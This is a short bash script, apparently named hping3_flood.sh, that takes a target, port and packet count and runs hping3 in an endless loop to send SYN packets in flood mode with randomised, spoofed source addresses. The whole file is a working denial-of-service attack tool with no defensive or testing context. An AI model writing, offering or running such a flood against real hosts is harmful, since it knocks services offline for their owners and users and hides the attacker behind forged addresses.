#!/bin/bash

if [ "$#" -ne 3 ];then
    echo "Usage: ./hping3_flood.sh <target> <port> <packet amount>";
    exit 0
fi

while : 
do
    sudo hping3 -c $3 -S -p $2 --flood --faster --rand-source $1 
done